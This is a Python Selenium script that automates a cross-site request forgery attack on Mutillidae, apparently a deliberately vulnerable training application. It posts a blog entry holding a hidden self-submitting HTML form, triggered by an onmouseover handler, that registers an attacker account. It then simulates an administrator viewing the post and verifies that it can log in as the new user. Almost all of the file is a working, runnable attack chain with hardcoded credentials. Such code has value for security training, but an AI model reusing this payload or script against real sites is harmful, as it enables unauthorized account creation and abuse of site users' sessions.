#!/usr/bin/env python

from selenium import webdriver
from bs4 import BeautifulSoup
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.action_chains import ActionChains
import time
import optparse
import re
import sys

class CSRFAttack():
	login = "bob"
	passwd = "bob"
	
	admlogin = "admin"
	admpasswd = "adminpass"

	blog_post = r"""<form id="csrf-f0rm" action="index.php?page=register.php" method="post" enctype="application/x-www-form-urlencoded">
<input name="username" value="%s" type="hidden"/>
<input name="password" value="%s" type="hidden"/>
<input name="confirm_password" value="%s" type="hidden"/>
<input name="my_signature" value="Created by admin" type="hidden"/>
<input name="register-php-submit-button" class="button" type="hidden" value="Create Account"/>
</form>
<span onmouseover="document.getElementById(\'csrf-f0rm\').submit()">Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF (sometimes pronounced sea-surf) or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.</span>"""%(login,passwd,passwd)

	def __init__(self, url):	
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:	
			add_blog = self.url+"/index.php?page=add-to-your-blog.php"
			print " [-] Openning url '%s'\n"%add_blog
			self.browser.get(add_blog)
			self.__wait()

			print " [-] Trying to add post to blog as 'anonymous'...\n"
			blog_entry = self.browser.find_element_by_name("blog_entry")
			btn = self.browser.find_element_by_name("add-to-your-blog-php-submit-button")
			blog_entry.send_keys(CSRFAttack.blog_post)
			btn.click()
			self.__wait()
	
			print " [-] Hey, Admin look at my new post...\n"

			print " [-] Admin is coming...\n"
			login_page = self.url+"/index.php?page=login.php"
			self.browser.get(login_page)
			self.__wait()

			uname = self.browser.find_element_by_name("username")
			passwd = self.browser.find_element_by_name("password")
			uname.send_keys(CSRFAttack.admlogin)
			passwd.send_keys(CSRFAttack.admpasswd)
			btn = self.browser.find_element_by_name("login-php-submit-button")
			btn.click()
			self.__wait()
			
			view_blog = self.url+"/index.php?page=view-someones-blog.php"
			print " [-] Admin trying to read new posts at '%s'\n"%view_blog
			self.browser.get(view_blog)
			self.__wait()

			author = Select(self.browser.find_element_by_name("author"))
			author.select_by_visible_text("Show All")
			btn = self.browser.find_element_by_name("view-someones-blog-php-submit-button")
			btn.click()
			self.__wait()
			
			sp = self.browser.find_element_by_xpath(xpath="//span[@onmouseover]")		
			ActionChains(self.browser).move_to_element_with_offset(sp,2,2).perform()
			self.__wait()

			print " [-] Oops new user '%s' was magically created\n"%CSRFAttack.login

			print " [-] Trying to log in as '%s'...\n"%CSRFAttack.login
			self.browser.delete_all_cookies()
			self.browser.get(login_page)
			self.__wait()

			uname = self.browser.find_element_by_name("username")
			passwd = self.browser.find_element_by_name("password")
			uname.send_keys(CSRFAttack.login)
			passwd.send_keys(CSRFAttack.passwd)
			btn = self.browser.find_element_by_name("login-php-submit-button")
			btn.click()
			self.__wait()

			page_src = self.browser.page_source
			
			soup = BeautifulSoup(page_src, "lxml")
			logged = soup.find("span", attrs={"id":"idSystemInformationHeading"}).get_text()

			if re.match("Logged In (User|Admin: %s.+)"%CSRFAttack.login, logged):
				print " [*] Attack was successful, you are logged in as '%s'"%CSRFAttack.login
			else:
				print " [*] Attack was not successfull, you are not logged in as '%s'"%CSRFAttack.login
			
		except Exception, e:
			print " [!] Attack was not successfull, error:", e
			
			
def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = CSRFAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()				
